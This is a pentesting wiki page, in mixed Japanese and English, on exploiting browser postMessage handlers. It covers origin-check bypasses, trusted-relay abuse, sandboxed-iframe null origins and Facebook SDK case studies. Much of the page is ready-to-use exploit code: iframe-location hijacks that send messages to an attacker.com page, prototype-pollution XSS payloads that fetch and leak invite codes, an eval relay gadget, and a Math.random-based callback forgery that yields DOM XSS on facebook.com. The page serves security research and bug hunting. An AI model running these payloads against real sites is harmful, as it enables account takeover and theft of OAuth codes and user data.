# PostMessage 脆弱性

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** を送信

**PostMessage** はメッセージを送信するために次の関数を使用します:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the Window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### iframe と **targetOrigin** の wildcard を悪用した攻撃

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **変更** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** は、JS が **`postMessages` を期待する** 関数を宣言するために使う関数です。\
次のようなコードが使用されます:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
メッセージの **`e.source`** を null に強制することができます。**iframe** を作成し、それが **postMessage** を **送信** して **即座に削除される** ようにします。

For more information **お読みください:**

{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

これらの攻撃を実行するには理想的には **被害者のウェブページを配置する** ことができ、`iframe` 内に入れられる必要があります。しかし、`X-Frame-Header` のようなヘッダーはその **挙動** を **阻止** することがあります。\
そのような場合でも、よりステルス性の低い攻撃を使うことができます。脆弱なウェブアプリケーションを新しいタブで開き、そこに対して通信することができます:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページをブロックして子 iframe に送られるメッセージを盗む

以下のページでは、データ送信前に**blocking**した**main**ページを利用し、子の**XSS**を悪用して受信前に**sensitive postmessage data**を**leak**することで、**child iframe**に送られたデータを盗む方法を確認できます:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe の location を変更してメッセージを盗む

X-Frame-Header のない、さらに別の iframe を含むウェブページを iframe にできる場合、**change the location of that child iframe** が可能です。もしその子が **postmessage** を **wildcard** を用いて受信しているなら、攻撃者はその iframe の **origin** を自分の管理するページに **change** し、メッセージを **steal** できます:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

postMessage を通じて送られたデータが JS によって実行されるシナリオでは、対象の **page** を **iframe** にし、エクスプロイトを `postMessage` で送ることで **prototype pollution/XSS** を **exploit**できます。

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Example of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**詳細情報**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) に関するページへのリンク
- [**XSS**](../xss-cross-site-scripting/index.html) に関するページへのリンク
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) に関するページへのリンク

### Origin由来のスクリプト読み込み & supply-chain pivot (CAPIG case study)

`capig-events.js` は `window.opener` が存在する場合にのみ `message` ハンドラを登録していました。`IWL_BOOTSTRAP` の際に `pixel_id` をチェックしましたが `event.origin` を保存し、その後 `${host}/sdk/${pixel_id}/iwl.js` を構築するために使用していました。

<details>
<summary>ハンドラが攻撃者制御の origin を書き込む</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Get an opener: 例: Facebook Android WebView では `window.name` を `window.open(target, name)` と再利用してウィンドウを自身の opener にし、その後悪意のある iframe からメッセージを postMessage で送る。
2. Send `IWL_BOOTSTRAP` from any origin to persist `host = event.origin` in `localStorage`.
3. Host `/sdk/<pixel_id>/iwl.js` on any CSP-allowed origin (takeover/XSS/upload on a whitelisted analytics domain). `startIWL()` then loads attacker JS in the embedding site (e.g., `www.meta.com`), enabling credentialed cross-origin calls and account takeover.

If direct opener control was impossible, compromising a third-party iframe on the page still allowed sending the crafted `postMessage` to the parent to poison the stored host and force the script load.

**Backend-generated shared script → stored XSS:** プラグイン `AHPixelIWLParametersPlugin` はユーザーのルールパラメータを `capig-events.js` に追記される JS と連結していた（例: `cbq.config.set(...)`）。`"]}` のようなブレイクアウトを注入すると任意の JS が注入され、これを読み込むすべてのサイトに配信される共有スクリプトで stored XSS を生じさせた。

### Trusted-origin allowlist isn't a boundary

A strict `event.origin` check only works if the **trusted origin cannot run attacker JS**. When privileged pages embed third-party iframes and assume `event.origin === "https://partner.com"` is safe, any XSS in `partner.com` becomes a bridge into the parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
実際に観測された攻撃パターン:

1. **パートナー iframe の XSS を悪用**して relay gadget を仕込み、任意の `postMessage` が信頼済みオリジン内で code exec になるようにする:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, compromised iframe に JS を送信して親に許可されたメッセージタイプを転送します。メッセージは `partner.com` から発信され、allowlist を通過し、安全でない方法で挿入される HTML を含みます:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. 親フレームが攻撃者のHTMLを注入し、**JS execution in the parent origin**（例: `facebook.com`）を発生させます。これにより OAuth コードの窃取やアカウント完全乗っ取りフローへのピボットが可能になります。

Key takeaways:

- **Partner origin isn't a boundary**: 「trusted」なパートナーに存在する任意の XSS は、攻撃者が許可されたメッセージを送信して `event.origin` チェックを回避できるようにします。
- ハンドラがパートナー制御のペイロードを **render** する（例: 特定メッセージタイプでの `innerHTML`）と、パートナーの妥協は same-origin DOM XSS になります。
- 広い **message surface**（多くのタイプ、構造検証なし）は、パートナー iframe が侵害された後にピボット用のガジェットを増やします。

### postMessage ブリッジでの **`Math.random()`** コールバックトークンの予測

メッセージ検証が `Math.random()` で生成された「shared secret」（例: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`）を使い、同じヘルパーが plugin iframe の名前付けも行っている場合、PRNG の出力を回復して信頼されたメッセージを偽造できます：

- **Leak PRNG outputs via `window.name`:** SDK は plugin iframe を `guid()` で自動命名します。トップフレームを制御できる場合、被害者ページを iframe にロードし、plugin iframe をあなたのオリジンにナビゲート（例: `window.frames[0].frames[0].location='https://attacker.com'`）して `window.frames[0].frames[0].name` を読み取ることで生の `Math.random()` 出力を取得できます。
- **Force more outputs without reloads:** 一部の SDK は再初期化パスを公開しています。FB SDK では `{xfbml:1}` を伴う `init:post` を発火すると `XFBML.parse()` が強制され、plugin iframe が破棄・再生成されて新しい名前／コールバックID が生成されます。再初期化を繰り返すことで必要な数だけ PRNG 出力を得られます（コールバック／iframe ID のための内部的な余分な `Math.random()` 呼び出しがあるため、途中の値をスキップする必要があります）。
- **Trusted-origin delivery via parameter pollution:** ファーストパーティの plugin エンドポイントが未サニタイズのパラメータをクロスウィンドウのペイロードに反映する場合（例: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`）、信頼された `facebook.com` オリジンを保持したまま `&type=...&iconSVG=...` を注入できます。
- **Predict the next callback:** 漏洩した iframe 名を `[0,1)` の浮動小数点に戻し、複数の値（連続している必要はない）を V8 の `Math.random` 予測器（例: Z3 ベース）に入力します。ローカルで次の `guid()` を生成して、期待されるコールバックトークンを偽造します。
- **Trigger the sink:** postMessage データを作成してブリッジが `xd.mpn.setupIconIframe` をディスパッチし、`iconSVG` に HTML（例: URL エンコードされた `<img src=x onerror=...>`）を注入するようにすると、ホスティングオリジン内で DOM XSS が成立します。そこから same-origin な iframe（OAuth ダイアログ、arbiters など）を読み取れます。
- **Framing quirks help:** このチェーンはフレーミングを必要とします。いくつかのモバイル webview では、`frame-ancestors` が存在すると `X-Frame-Options` が未サポートの `ALLOW-FROM` に退化する場合があり、“compat” パラメータが緩い `frame-ancestors` を強制して `window.name` サイドチャネルを有効にすることがあります。

#### 最小限の偽造メッセージの例
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考資料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: postMessage の信頼を悪用した OAuth code exfiltration による Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
